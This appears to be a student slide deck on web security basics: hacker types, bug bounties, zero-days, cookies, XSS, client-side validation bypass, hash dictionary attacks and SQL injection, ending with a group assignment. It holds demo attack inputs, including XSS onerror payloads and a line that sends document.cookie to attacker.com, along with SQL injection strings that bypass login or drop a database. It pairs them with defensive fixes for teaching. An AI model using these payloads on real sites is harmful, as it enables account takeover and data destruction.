Hackers












"A hacker is a person skilled in information technology
who achieves goals by non-standard means."

Wikipedia

















Intent

Permission
















Intent can be malicious:

- to break into the system
- to steal passwords
- to steal money
- to steal personal data



















Permission can be:

- granted
- not granted



















Depending on the intent and permission
hackers can be:


1) Black-Hat Hackers
Have malicious intent and no permission.
Goal: Exploit systems for personal gain
They steal money, data or do sabotage.

2) White-Hat Hackers (ethical)
Have good intent and have permission
to do penetration testing.
Goal: Find vulnerabilities to improve security.

3) Gray-Hat Hackers
Have good intent, but they don't
have a permission.
Goal: Hack systems to expose flaws
but it might be controversial.




Example:

Black-Hat → Stealing credit card data.

White-Hat → Have a contract with a company to
hack company’s system to reveal the bugs.

Gray-Hat → Breaking into a website
to alert admins about a vulnerability
(without asking first).















Penetration Testing






It is a simulated cyberattack performed
by ethical hackers to identify security
vulnerabilities in a system, network,
or application.






Key Points:

- Authorized & Legal – Done with permission to improve security.
- Mimics Real Attacks – Uses hacker techniques to find weaknesses.
- Provides Fixes – Reports vulnerabilities so they can be patched.










Bug Bounty Programs





Initiatives which invite you to
try to hack systems and get
a reward for finding any vulnerabilities.



Links:


Google – https://www.google.com/about/appsecurity/reward-program/
Microsoft – https://www.microsoft.com/en-us/msrc/bounty
Apple – https://security.apple.com/bounty/

Uber – https://hackerone.com/uber
Spotify – https://hackerone.com/spotify
GitHub – https://bounty.github.com/
U.S. Pentagon – https://hackerone.com/deptofdefense



Please, remember:

- Read Rules First.
What is allowed and how much they pay.

- Responsible Disclosure.
Never test without permission outside bug bounty programs!

















Exploits














An exploit is a software, code, or a technique
that takes advantage of a vulnerability.



Exploits are used to:

- gain unauthorized access
- execute arbitrary code
- steal passwords/money/data





















Examples of exploits:

- remote
hacker logs into remote system

- local
hackers use vulnerable software
to gain access to local system

- web
hackers attack web applications
(SQL injections or XSS)















Once exploit is found it is
published in the internet.

https:www.exploit-db.com/

https:www.cvedetails.com/

CVE = Common Vulnerabilities and Exposures







If you as a site owner don't fix
your code, hackers will likely use
known CVE to attack you.






















Zero-Day Exploits




















The most dangerous!

No one have publicly reported
these vulnerabilities yet.

Hence, there is no official patch
for these vulnerabilities.

But this doesn't mean that no one
knew or found them already.

Black-Hat hackers may have found these
vulnerabilities and are exploiting them.


"zero-days" -> developers have 0 days
for fixing these vulnerabilities,
before hackers start exploiting them.














Example Zero-Day Lifecycle:

1) Vulnerability Found
2) Exploit Sold
3) Attack
4) Patch Released
5) Attacks Decline













Famous Zero-Day Exploits


WannaCry (2017)
Ransomware that encrypted 200,000+ systems globally.
Disrupted hospitals, banks, and governments.

SolarWinds (2020)
Hackers spied on classified data for months
targeting U.S. government agencies via compromised
software updates.

Log4Shell (2021)
Allowed remote code execution via simple text strings
due to vulnerability: CVE-2021-44228 in Apache Log4j.
Millions of servers compromised













How to protect your software?



- Update software.
Even if there is no zero-day patches
available, still patches close other vulnerabilities
and limit the attack surface.

- Use EDR/XDR tools.
EDR = Endpoint Detection & Response
XDR = Extended Detection & Response

These are special tools which monitor
any activity detect abnormal behaviour
and block suspicious actions.

- Limit attack surface.
For example, disable unused services.















Cookie







A cookie is some value stored
in your browser by websites
you visit. It helps websites remember:

- Login sessions (so you stay logged in).
- Preferences (like language or theme settings).
- Tracking (e.g., shopping cart items, ads you’ve seen).







How cookies work?






1. You visit a website (let's say linkedin.com)
2. You log in (give your username and password).
3. Website saves a small unique hash value (a cookie)
in your browser. It is physically saved to your computer.
4. You close the browser. Cookie stays in the memory
of your machine.
5. You open browser and go to linkedin.com.
6. Website checks your browser storage and finds a cookie
from previous session.
7. The website trusts this cookie and logs you in.






Now, vulnerability appears:

If I have YOUR cookie, the website
will "think" that I am YOU
and will log me into YOUR account.












How to see your cookies?







go to google.com for example.
in devTools go to Application tab
select 'Cookies'.















XSS

Cross-Site Scripting











XSS occurs when an attacker injects
malicious scripts into a web application.
These scripts are then executed in the
browser of other users.

When attacker is able to execute
JS code on a victim's machine, they can:

- steal session cookies
- redirect users to malicious websites
- deface the page












XSS becomes possible when we don't
sanitize user input in JS code.













Example

HTML:

<label for="userInput">Type something</label>
<input type="text" id="userInput" name="user_input">

<button onclick="displayInput()">Display</button>

<div id="output">Your content will appear here.</div>

JS:

function displayInput() {
    const userInput = document.getElementById("userInput").value;
    document.getElementById("output").innerHTML = userInput;
}




This code is vulnerable to XSS attack!

It opens door wide open for hackers
to inject any JS code into our page.







example malicious inputs:

<img src='fake' onerror='alert("You are hacked now!")'>
<a href="javascript:alert('You are hacked again!')">Click me</a>






The problem here:

- The code blindly trusts user input
and inserts it directly into the page.

Never trust user input!








/demo/xss.html












IMPORTANT!
Never trust user input.











XSS and Cookies






/demo/xss_cookie.html







malicious input:

<img src='x' onerror='function stealCookies(){alert(document.cookie)}; stealCookies()'>
<img src='x' onerror='((){alert(document.cookie)})()'>
<img src='x' onerror='(alert(document.cookie))()'>





self-invoking function syntax:

( function body )()










Send the cookie to your server:


<img src='x' onerror=
'fetch("https://attacker.com/steal?cookie_stolen="+encodeURIComponent(document.cookie))'>












IMPORTANT!
Never trust user input.














How to prevent XSS?


- Never trust user input!

- Never use innerHTML for user input.
Use textContent instead.

- Add special <meta> tag to your HTML <head>:
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">

It blocks:

-- Inline scripts (<script>alert(1)</script>).
-- External scripts (<script src="https://evil.com/hack.js">).
-- Dangerous tags (<img onerror="malicious-code">).

- Sanitize input with JS.


Step 1. Create sanitization method

function sanitize(input) {
  return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

/</g it is a regex:

< = literally means '<'
g = search globally, everywhere in the string


Step 2. Use sanitization method for all inputs

document.getElementById("output").innerHTML = sanitize(userInput);












Form Validation Bypass









You should never trust your
JS validation on client-side
(in the browser of your client).

Because it is very easy to
bypass this validation.







/demo/form_validation.html





First, don't change any settings
and open Private (Incognito) window
and type "bad".

You will see that my JS validation works.





Now, let's bypass it.







1) Disabling JS in the browser








In Brave go to Settings
Type "Javascript"
Select "Site and Shields Settings"
Select "JavaScript"
Select "Don't allow site to use Javascript"


Next, open incognito window.

Next, copy the path to /demo/form_validation.html
and open it in incognito.

If I submit the malicious code into input
it is submitted - see Network tab and payload.









2) Manipulating HTML code



Don't disable JS in browser.
Open the devtools.
Change id of the input
(right click + Edit as HTML)
Submit malicious code.
See Network tab and payload.















IMPORTANT!
Never trust user input!












Solution?

Always do validation on the backend!
Never trust client side validation.





























Dictionary Attack













What is encrypted here?

e99a18c428cb38d5f260853678922e03





















Step 1. Hackers will get the list of most
popular passwords, like:

123456
password
qwerty
abc123
11111
letmein


















Step 2. They will generate hashes
for this list:

123456:    e10adc3949ba59abbe56e057f20f883e
password:  5f4dcc3b5aa765d61d8327deb882cf99
qwerty:    d8578edf8458ce06fbc5bb76a58c5ca4
abc123:    e99a18c428cb38d5f260853678922e03
11111:     96e79218965eb72c92a549dd5a330112
foo:       d3b07384d113edec49eaa6238ad5ff00




Now they have a dictionary!

They can search this dictionary for any hash
add get plain text equivalent.

If hacker broke into your server
and got this hash:

d3b07384d113edec49eaa6238ad5ff00

By searching the dictionary, they will
find equivalent: "foo".

That's how they will know your password!




















Dictionaries are publicly available.




You can search a dictionary:

https://hashes.com/en/decrypt/hash
Search for "d3b07384d113edec49eaa6238ad5ff00"




There are dictionaries of popular passwords
for brute-force attacks:

SQL injection












SQL Injection is a code injection attack.
I inject SQL code into input field
and force application to run it.

This allows:

- Bypass authentication (log in without credentials).
- Steal, modify, or delete data in DB.
- Execute admin-level operations.









Example:


DB


table: users
id - email           - username - password
1  - admin@email.com - admin    - 12345
2  - user@email.com  - andrei   - 5a3b3-4(*
3 ...
4 ...


SQL query:

SELECT * FROM users WHERE username = 'admin' AND password = '12345';


Now, when I get user input and try
to compare it to what I have in DB,
I will have this PHP script:

PHP

username = request.POST['username'];
password = request.POST['password'];
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';"












If user submitted something good:

username: 'admin'
password: '12345'

The final query will look like:

PHP:
username = 'admin' // request.POST['username'];
password = '12345' // request.POST['password'];
query = "SELECT * FROM users WHERE username = 'admin' AND password = '12345';"









What if user will give this username and no password?

username: "admin' -- "
password: ''










The query will look like:

PHP:
username = "admin' -- " // request.POST['username'];
password = '' // request.POST['password'];

SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';





In SQL comment (--) is telling SQL engine to IGNORE anything after it.

So effectively this query:
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';

is this query:

SELECT * FROM users WHERE username = 'admin';

After running this query, it will be successful,
because there is a user 'admin' in DB.

This will let me in, bypassing login.














Another example of SQL injection

' OR 1=1; DROP DATABASE; --






PHP:
username = "' OR 1=1; DROP DATABASE; -- " // request.POST['username'];
password = '' // request.POST['password'];

SELECT * FROM users WHERE username = '' OR 1=1; DROP DATABASE; -- ' AND password = '';

which is:

SELECT * FROM users WHERE username = '' OR 1=1;
DROP DATABASE;












Never trust user input!

#12 - VULNERABLE AND OUTDATED COMPONENTS




How to accept?


- Form a group of 3-5 students.
- Decide who is your team leader.
- Choose vulnerability from the list and tell your teacher.
- Team leader first accepts Assignment via Github Classroom link.
- Team leader creates group with
the name equal to your vulnerability name
(e.g. Vulnerability chosen "PHISHING/SPOOFING",
name of GitHub team "phishing_spoofing" or similar)
- Any other team member select this team when accepting
the assignment link.
- You will get a team repo (the same for each team member).
- You can clone this repo individually.


How to collaborate?

- Team leader should do first:

> git clone <repo>
> git checkout -b develop
> git push origin develop

This way you all will have shared 'develop' branch.

- Next, each team member:

> git clone <repo>
> git checkout -b develop
> git pull origin develop

- After that each team member locally
adds corresponding content to the sections.
And pushes changes to 'develop' branch:

> git add .
> git commit -m "Added XSS examples"
> git push origin develop




How to submit?

- Once your work is done, your team leader
creates one PR in group repo.
- Each team member submits the link to this
PR via Blackboard.














 Thank you
